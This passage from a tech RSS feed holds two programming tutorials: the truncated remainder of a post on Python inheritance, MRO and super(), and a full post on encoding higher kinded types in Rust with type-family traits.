&lt;bound method Person.intro of &lt;__main__.Employee object at 0x109bd7640&gt;&gt;
<span>&gt;&gt;&gt;</span> e.intro<span>()</span>
Traceback <span>(</span>most recent call last<span>)</span>:
  File <span>"&lt;stdin&gt;"</span>, line 1, <span>in</span> &lt;module&gt;
  File <span>"/Users/sangeeta/Code/pystuff/super.py"</span>, line 111, <span>in </span>intro
    <span>return </span>f<span>'Hi I\'</span>m <span>{</span>self.name<span>}!</span><span>'
AttributeError: '</span>Employee<span>' object has no attribute '</span>name<span>'
&gt;&gt;&gt;
&gt;&gt;&gt; e.name = '</span>Sangeeta<span>'   # Finally setting a name attribute
&gt;&gt;&gt; e.intro()
"Hi I'</span>m Sangeeta!<span>"</span></code></pre></figure>

<hr>

<blockquote>The parent class attributes and methods are inherited by default if they are not explicitly defined in the subclass</blockquote>
<p>Let‚Äôs drive this point home with another example, whereby both Person and Employee‚Äôs <code>__init__</code> set the same <code>name</code> attribute, but this time the Person‚Äôs <code>name</code> attribute is uppercased.</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span><span>.</span><span>upper</span><span>()</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span></code></pre></figure>

<p>Our Employee class uses its own <code>name</code> attribute, not the Person‚Äôs <code>name</code> attribute.</p>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> e <span>=</span> Employee<span>(</span><span>'Sangeeta'</span><span>)</span>
<span>&gt;&gt;&gt;</span> e
&lt;__main__.Employee object at 0x101a3b640&gt;
<span>&gt;&gt;&gt;</span> e.name
<span>'Sangeeta'</span>
<span>&gt;&gt;&gt;</span> e.intro<span>()</span>
<span>"Hi I'm Sangeeta!"</span>
<span>&gt;&gt;&gt;</span>
<span>&gt;&gt;&gt;</span>
<span>&gt;&gt;&gt;</span> p <span>=</span> Person<span>(</span><span>'Sangeeta'</span><span>)</span>
<span>&gt;&gt;&gt;</span> p
&lt;__main__.Person object at 0x101a3b700&gt;
<span>&gt;&gt;&gt;</span> p.name
<span>'SANGEETA'</span>
<span>&gt;&gt;&gt;</span> p.intro<span>()</span>
<span>"Hi I'm SANGEETA!"</span></code></pre></figure>

<h3 id="multiple-inheritance-">Multiple Inheritance ü•û</h3>
<p>When a class inherits from multiple classes, its behavior is directly determined by the order of parent classes in the class definition. Let‚Äôs take a look at an example first:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>class</span> <span>Pythonista</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span> and I love Python!'</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>In this example, a call to Employee‚Äôs <code>intro</code> method will call the Person‚Äôs <code>intro</code> method because it is the first class of the inheritance chain (from left to right) that has an <code>intro</code> method defined. The golden rule is</p>
<blockquote>
If a method is called, Python will look for that method in the class. If it doesn't find it, it will look in the next class listed in this fancy thing called the MRO until it finds it. If it doesn't find it in that chain, it will raise an AttributeError.
</blockquote>
<p>In this example, Pythonista‚Äôs methods will actually never be used since Person defines the same methods as Pythonista. In other words, any call to an Employee instance‚Äôs <code>__init__</code> and <code>intro</code> will always refer to the Person class.</p>

<h3 id="mro-omg-wtf-">MRO OMG WTF üò≥</h3>
<p>A big part of the inheritance picture for me was understanding that inheritance is always in the context of the MRO. In fact, all the examples we‚Äôve seen so far have been making use of MRO, but now lets take a closer look at what it is and how it works in more complex examples.</p>

<p>In our Employee example, the order of parent classes in the class definition defines the order in which method resolution happens. This is precisely MRO ‚Äì Method Resolution Order ‚Äì a list that Python constructs to figure our which parent class to use to lookup a method!</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Pythonista</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> Employee.mro<span>()</span>
<span>[</span>&lt;class <span>'__main__.Employee'</span><span>&gt;</span>, &lt;class <span>'__main__.Person'</span><span>&gt;</span>, &lt;class <span>'__main__.Pythonista'</span><span>&gt;</span>, &lt;class <span>'object'</span><span>&gt;]</span></code></pre></figure>

<p>üí° <em>Bonus tip</em>: Since we are using Python3 for these examples, the Person and Pythonista implicitly inherit from <code>object</code>, so in fact <code>class Person: pass</code> is the same as <code>class Person(object): pass</code>.</p>

<p>There are some intricacies in how the MRO is created. What if Person and Pythonista both inherited from other classes? Let‚Äôs look at a different example:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Human</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Person</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Programmer</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Pythonista</span><span>(</span><span>Programmer</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> Employee.mro<span>()</span>
<span>[</span>&lt;class <span>'__main__.Employee'</span><span>&gt;</span>, &lt;class <span>'__main__.Person'</span><span>&gt;</span>, &lt;class <span>'__main__.Human'</span><span>&gt;</span>, &lt;class <span>'__main__.Pythonista'</span><span>&gt;</span>, &lt;class <span>'__main__.Programmer'</span><span>&gt;</span>, &lt;class <span>'object'</span><span>&gt;]</span></code></pre></figure>

<p>When constructing the MRO, Python uses an algorithm called the <a href="https://en.wikipedia.org/wiki/C3_linearization" target="_blank">C3 linearization algorithm</a> to go through the inheritance chain of each parent class and condense the entire list in a way that conforms to certain constraints. The rule of thumb is that ordering should occur from the most specific class listed down to its parents, and child classes must precede their parents.</p>

<p>Below shows how Employee‚Äôs MRO is constructed from the example above:</p>

<p><img src="https://sangeeta.io/images/python-inheritance-example1.gif" alt="Employee inheritance example 1"></p>


<p>As we can see, <code>object</code> (the parent of all classes in Python) appears twice, so following the rule that children precede parents, the rightmost instance of <code>object</code> remains and the other duplicate is removed.</p>

<p>Let‚Äôs see another example:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Human</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Person</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Pythonista</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Person</span><span>,</span> <span>Pythonista</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>In this case, both Person and Pythonista inherit from the same parent class, so the MRO for Employee would be formed like this:</p>

<p><img src="https://sangeeta.io/images/python-inheritance-example2.gif" alt="Our Employee inheritance example 2"></p>


<figure><pre><code data-lang="shell"><span>&gt;&gt;&gt;</span> Employee.mro<span>()</span>
<span>[</span>&lt;class <span>'__main__.Employee'</span><span>&gt;</span>, &lt;class <span>'__main__.Person'</span><span>&gt;</span>, &lt;class <span>'__main__.Pythonista'</span><span>&gt;</span>, &lt;class <span>'__main__.Human'</span><span>&gt;</span>, &lt;class <span>'object'</span><span>&gt;]</span></code></pre></figure>

<p>Be mindful that there is a wrong way to inherit, in which Python will throw a nice little TypeError exception at you. Let‚Äôs take a look at such a case:</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Human</span><span>:</span>
    <span>pass</span>


<span>class</span> <span>Person</span><span>(</span><span>Human</span><span>):</span>
    <span>pass</span>


<span>class</span> <span>Employee</span><span>(</span><span>Human</span><span>,</span> <span>Person</span><span>):</span>
    <span>pass</span></code></pre></figure>

<p>If we try to create an Employee instance, we get hit with this:</p>

<figure><pre><code data-lang="shell">Traceback <span>(</span>most recent call last<span>)</span>:
  File <span>"/Users/sangeeta/Code/pystuff/super.py"</span>, line 133, <span>in</span> &lt;module&gt;
    class Employee<span>(</span>Human, Person<span>)</span>:
TypeError: Cannot create a consistent method resolution
order <span>(</span>MRO<span>)</span> <span>for </span>bases Human, Person</code></pre></figure>

<p>With the MRO rule that children precede parents, you‚Äôd think the MRO would resolve itself but we run into some problems:</p>

<p><img src="https://sangeeta.io/images/python-inheritance-example3.gif" alt="Our Employee inheritance example 3"></p>


<p>The problem is that Human is a direct parent class of Employee so it cannot be thrown to the right just because Person also subclasses from it; it needs to stay there because its a direct parent. This breaks the other constraint that child classes should precede their parents. In this case, Python cannot satisfy all constraints of the MRO, therefore it throws an exception. Refer to this <a href="https://stackoverflow.com/a/42567588" target="_blank">StackOverflow answer</a> for a more detailed answer to this problem.</p>

<p>If you ever come across this, you should probably reconsider your inheritance choices and logic decisions. Fortunately, Python equips us with a powerful function called <code>super</code> to give us the ability to call parent methods within child class methods and create better logic flow when subclassing.</p>

<h3 id="super-duper-super-">super duper super üí•</h3>
<p>Inheritance is great because we inherit functionality from parent classes into our subclasses. As it is, we can either</p>
<ul>
  <li>use parent class methods</li>
  <li>or override methods if we want custom subclass logic</li>
</ul>

<p>But sometimes, in more real world scenarios, we want both! We want to <em>tap into</em> the parent class‚Äôs logic and insert that either before or after our custom logic. We can achieve just that with the <code>super</code> function.</p>

<p>Calling <code>super()</code> within a subclass method will lookup the next class in the MRO which has that method defined and call it.</p>

<p>The following example is bit of a no-op illustration of what calling super does. Both implementations of the Employee class behave the same.</p>

<figure><pre><code data-lang="python"><span>class</span> <span>Person</span><span>:</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>self</span><span>.</span><span>name</span> <span>=</span> <span>name</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>f</span><span>'Hi I</span><span>\'</span><span>m </span><span>{</span><span>self</span><span>.</span><span>name</span><span>}</span><span>!'</span>


<span>###### Implicit ######
</span><span>class</span> <span>Employee1</span><span>(</span><span>Person</span><span>):</span>
    <span>pass</span>


<span>###### Explicit ######
</span><span>class</span> <span>Employee2</span><span>(</span><span>Person</span><span>):</span>
    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>name</span><span>):</span>
        <span>super</span><span>().</span><span>__init__</span><span>(</span><span>name</span><span>)</span>

    <span>def</span> <span>intro</span><span>(</span><span>self</span><span>):</span>
        <span>return</span> <span>super</span><span>().</span><span>intro</span><span>()</span></code></pre></figure>

<p>In Employee2, we are overriding the <code>__init__</code> and <code>intr‚Ä¶</code></p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sangeeta.io/posts/a-super-post-on-python-inheritance/">https://sangeeta.io/posts/a-super-post-on-python-inheritance/</a></em></p>]]>
            </description>
            <link>https://sangeeta.io/posts/a-super-post-on-python-inheritance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26195226</guid>
            <pubDate>Fri, 19 Feb 2021 17:08:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Higher Kinded Types in Rust]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26195079">thread link</a>) | @ibraheemdev
<br/>
February 19, 2021 | https://rustyyato.github.io/type/system,type/families/2021/02/15/Type-Families-1.html | <a href="https://web.archive.org/web/*/https://rustyyato.github.io/type/system,type/families/2021/02/15/Type-Families-1.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Do you want to use Higher Kinded Types (<code>HKT</code>) in Rust? Are you tired of waiting for <code>GAT</code>? Well, this is the place to be.</p>

<p>It‚Äôs easiest to understand <code>HKT</code> by analogy. In programming we have many different tiers of abstractions. Starting at the bottom we have <code>term</code>s (aka values) like <code>0</code>, <code>true</code>, <code>"hello world!"</code>. If we want to work with a lot of <code>term</code>s that share a property, we use <code>type</code>s. For example, if we want to work with ‚Ä¶</p>

<ul>
  <li>32-bit integer, we use <code>i32</code></li>
  <li>utf-8 strings, we use <code>&amp;str</code> or <code>String</code></li>
</ul>

<p>We generally use snake case to refer to <code>term</code>s generically like <code>x</code>, <code>im_an_integer</code>, and <code>database_connection</code>. We use functions to operate on these generic values.</p>

<div><div><pre><code><span>fn</span> <span>add_one</span><span>(</span>
    <span>// a generic 32-bit integer</span>
    <span>x</span><span>:</span> <span>i32</span>
<span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span> <span>x</span> <span>+</span> <span>1</span> <span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers, we come to <code>type</code>s. For example: <code>String</code>, <code>i32</code>, or <code>bool</code>. If we want to work with a lot of <code>type</code>s that share a property, we use <code>trait</code>s and generics. For example, if we want to work with ‚Ä¶</p>

<ul>
  <li>types that can be debug printed, we use <code>std::fmt::Debug</code></li>
  <li>types that can be iterated, we use <code>Iterator</code></li>
</ul>

<p>We generally use pascal case to refer to <code>types</code>s generically like <code>T</code>, <code>Self</code>, and <code>This</code>. We use generic functions to work with these generic types.</p>

<div><div><pre><code><span>fn</span> <span>print</span><span>&lt;</span><span>T</span><span>:</span> <span>Debug</span><span>&gt;</span><span>(</span><span>x</span><span>:</span> <span>T</span><span>)</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>x</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers again, we come to <code>kind</code>s. For example: <code>Option</code>, <code>Result</code>, or <code>Vec</code>. Wait what. Let‚Äôs take a step back. Before I mentioned that <code>String</code>, <code>i32</code>, and <code>bool</code> are types. We also have more types that we can use, generic types like <code>Option&lt;i32&gt;</code> or <code>Result&lt;String, String&gt;</code>. What if you want to generalize over these types? Something of the form <code>T&lt;U&gt;</code>. That‚Äôs where we get to kinds. For example:</p>

<ul>
  <li><code>i32</code> has the kind <code>Type</code></li>
  <li><code>Option&lt;i32&gt;</code> has the kind <code>Type</code></li>
  <li><code>'a</code> has the kind <code>Lifetime</code></li>
  <li><code>Option</code> has the kind <code>Type -&gt; Type</code>
    <ul>
      <li>W H A T, let‚Äôs stop and explain what‚Äôs going on here</li>
    </ul>
  </li>
</ul>

<p>Generic types can be represented as a function from kinds to kinds. For example, <code>Option</code> is a function that takes a <code>Type</code> and produces a <code>Type</code> (hence <code>Type -&gt; Type</code>). Let‚Äôs see some more examples:</p>

<ul>
  <li><code>Result</code> has the kind <code>Type -&gt; Type -&gt; Type</code>
    <ul>
      <li>I‚Äôll use this notation because that‚Äôs how it‚Äôs done in the literature</li>
      <li>Note: this is equivalent to <code>(Type, Type) -&gt; Type</code> (you can always transform a function that take a tuple of arguments into one that takes multiple arguments, and vice versa)</li>
    </ul>
  </li>
  <li>references have a kind <code>Lifetime -&gt; Type -&gt; Type</code>
    <ul>
      <li><code>&amp;'a T</code>, one lifetime and one type parameter :)</li>
    </ul>
  </li>
  <li>arrays have the kind <code>Type -&gt; usize -&gt; Type</code>
    <ul>
      <li><code>[T; len]</code>, one type and one <code>usize</code> <code>term</code> (getting close to dependent types, something we won‚Äôt touch in this post)</li>
    </ul>
  </li>
</ul>

<p>With this notion of <code>kind</code>s we are now well equipped to generalize over generics. Just one cinch, <code>Rust</code> doesn‚Äôt know about <code>kind</code>s! So how do we generalize over generics if we can‚Äôt even express the fundamental building blocks.</p>



<p>The key insight is that we can represent <code>kind</code>s as a system of types and traits. For example, here‚Äôs how to handle <code>Type -&gt; Type</code> kinds.</p>

<p>Note: I‚Äôll show how <code>Option</code> fits in, and introduce <code>Result&lt;_, E&gt;</code>, but I‚Äôll leave the implementation of <code>Vec</code> to you. It‚Äôs an interesting puzzle if you are inclined</p>

<div><div><pre><code><span>// `Option` has the kind `Type -&gt; Type`,</span>
<span>// we'll represent it with `OptionFamily`</span>
<span>struct</span> <span>OptionFamily</span><span>;</span>
<span>// `Result` has the kind `Type -&gt; Type -&gt; Type`,</span>
<span>// so we fill in one of the types with a concrete one</span>
<span>struct</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>&lt;</span><span>E</span><span>&gt;</span><span>);</span>

<span>// I'll leave the implementation of `VecFamily` to you</span>

<span>// This trait represents the `kind` `Type -&gt; Type`</span>
<span>pub</span> <span>trait</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>{</span>
    <span>// This represents the output of the function `Type -&gt; Type`</span>
    <span>// for a specific argument `A`.</span>
    <span>type</span> <span>This</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>// `OptionFamily` represents `Type -&gt; Type`,</span>
    <span>// so filling in the first argument means</span>
    <span>// `Option&lt;A&gt;`</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span> <span>{</span>
    <span>// note how all results in this family have `E` as the error type</span>
    <span>// This is similar to how currying works in functional languages</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Result</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Note how a <code>trait</code> can act as a function over types, so you can encode the idea <code>Type -&gt; Type</code> using a trait!</p>

<p>Let‚Äôs also introduce a type alias for ease of use.</p>

<div><div><pre><code><span>// Option&lt;A&gt; == This&lt;OptionFamily, A&gt;</span>
<span>pub</span> <span>type</span> <span>This</span><span>&lt;</span><span>T</span><span>,</span> <span>A</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;&gt;</span><span>::</span><span>This</span><span>;</span>
</code></pre></div></div>

<p>Now we can replace all usage of <code>Option</code>, <code>Result&lt;_, E&gt;</code> with <code>OptionFamily</code> or <code>ResultFamily&lt;E&gt;</code>! From this we can build up abstractions that ‚Äúrequire‚Äù HKT. Let‚Äôs start with the simplest abstraction <code>Functor</code>. This is just any <code>Type -&gt; Type</code> that has a notion of mapping a value. Generally <code>Functor</code> represents a collection, but it can do much more than that (But I won‚Äôt dive into <code>Functor</code> in particular in this post).</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is quite a lot, so let‚Äôs soak it in.</p>

<div><div><pre><code><span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span>
</code></pre></div></div>

<p>First, we require that our families can be used with either type. This allows you to restrict the families in some ways, for example for <code>HashSet</code>, only allow <code>T: Hash + Eq</code>. <code>A</code> will be the input type, and <code>B</code> will be the output type.</p>

<div><div><pre><code><span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>Next we have this monstrous function! This will be easier to explain if we have a concrete family.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>So this is just the same as the ordinary map in <code>Option</code>, except it requires <code>Fn</code>, instead of <code>FnOnce</code>. We could generalize over <code>Fn</code> and <code>FnOnce</code> if Rust had associated traits, but alas we don‚Äôt, so we‚Äôll have to make do with <code>Fn</code> (I‚Äôll leave it to you to figure out a nice way to abstract over <code>Fn</code>, <code>FnMut</code> and <code>FnOnce</code>). All we‚Äôve done is generalize it to <em>any</em> family, not just <code>Option</code>.</p>

<p>The <code>Copy</code> bound is nice for things like <code>Vec</code> where you need to apply the function multiple times. You can convert any <code>Fn</code> to a <code>Fn + Copy</code> because <code>&amp;_</code> implement <code>Fn</code> and are <code>Copy</code>.</p>

<p>So all together again:</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p><code>Functor</code> just specifies a mapping operation. We can implement this rather easily.</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// I'm not cheating!</span>
        <span>this</span><span>.map</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>Ok, but that‚Äôs boring, I hear you say. What about <code>Monad</code>? Typically it‚Äôs defined by it‚Äôs <code>bind</code> operation (We‚Äôll skip <code>Applicative</code> here, try it out yourself!). I‚Äôm not going to explain how <code>Monad</code> works, or why you would want it, just how to implement it.</p>

<div><div><pre><code><span>trait</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Looks the same as <code>Functor</code> to me! ‚Ä¶ Wait, the bound on <code>F</code> looks funky. Let‚Äôs dig in to the <code>OptionFamily</code> implementation again, maybe that will clear things up.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>This looks very familiar, ‚Ä¶ where have I seen this before? <code>Option::and_then</code> is that you?</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// It fits üòâ</span>
        <span>this</span><span>.and_then</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>In this way you can implement most, if not all <code>HKT</code> abstractions in stable Rust. However the ergonomics of these abstractions are downright abysmal. Bounds, bounds, bounds <em>everywhere</em>. We saw this a little in <code>Functor&lt;A, B&gt;</code>, we needed <code>OneTypeParam&lt;A&gt; + OneTypeParam&lt;B&gt;</code> (why does family need to be repeated!). Hopefully we can solve this on nightly, find out next time ‚Ä¶</p>

<p>If you can‚Äôt wait and must know more, check out <a href="https://github.com/rustyyato/type-families"><code>type-families</code></a>, an experimental crate that implements the ideas outlined in this blog post.</p>

<p>You can discuss this on reddit <a href="https://www.reddit.com/r/rust/comments/ll9un4/generalizing_over_generics_in_rust_part_1_aka/">here</a> or the users.rust-lang.org <a href="https://users.rust-lang.org/t/generalizing-over-generics-in-rust-part-1-aka-higher-kinded-types-in-rust/55716/2">here</a></p>

<p>Credits:</p>

<p>Thanks /u/CalligrapherMinute77 for requesting this post
Thanks /u/IshKebab for helping me reword the introduction to make things more clear</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
